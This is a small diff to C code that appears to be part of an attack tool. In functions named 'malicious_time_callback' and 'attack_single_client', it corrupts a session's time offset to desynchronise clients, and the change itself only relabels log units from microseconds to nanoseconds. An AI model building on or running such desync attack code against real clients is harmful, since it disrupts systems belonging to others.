@@ -28,8 +28,8 @@ void malicious_time_callback(
     malicious_offset += 10000000;
     session->time_offset = malicious_offset;
     
-    printf("[*] Corrupted time offset to: %lld microseconds (%.2f seconds)\n", 
-           (long long)malicious_offset, malicious_offset / 1000000.0);
+    printf("[*] Corrupted time offset to: %lld nanoseconds (%.2f seconds)\n", 
+           (long long)malicious_offset, malicious_offset / 1000000000.0);
 }
 
 void attack_single_client(char* ip, char* port, int client_id) {
@@ -59,7 +59,7 @@ void attack_single_client(char* ip, char* port, int client_id) {
         usleep(100000);
         
         if (i % 10 == 0) {
-            printf("[Client %d] Desync iteration %d, offset: %lld us\n", 
+            printf("[Client %d] Desync iteration %d, offset: %lld ns\n", 
                    client_id, i, (long long)session.time_offset);
         }
     }
